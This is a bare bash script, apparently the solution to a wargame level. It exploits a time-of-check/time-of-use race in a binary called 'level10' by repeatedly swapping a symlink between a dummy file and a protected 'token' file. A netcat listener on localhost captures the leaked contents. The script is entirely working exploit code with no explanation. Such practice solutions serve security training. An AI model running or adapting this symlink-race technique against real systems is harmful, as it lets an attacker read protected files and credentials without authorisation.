DFILE=/tmp/dummyfile
OFILE=/tmp/output_file
CONTROL=/tmp/difffile
LNFILE=/tmp/lnfile
PAYLOAD=~/token
echo -n '' > $DFILE
echo -n '' > $OFILE
echo -n '' > $CONTROL
while [[ ! $(diff $CONTROL $OFILE) ]]; do
        nc -l localhost 6969 > $OFILE&
        ln -fs $DFILE $LNFILE
        ~/level10 $LNFILE 127.0.0.1&
        ln -fs $PAYLOAD $LNFILE
done

cat $OFILE
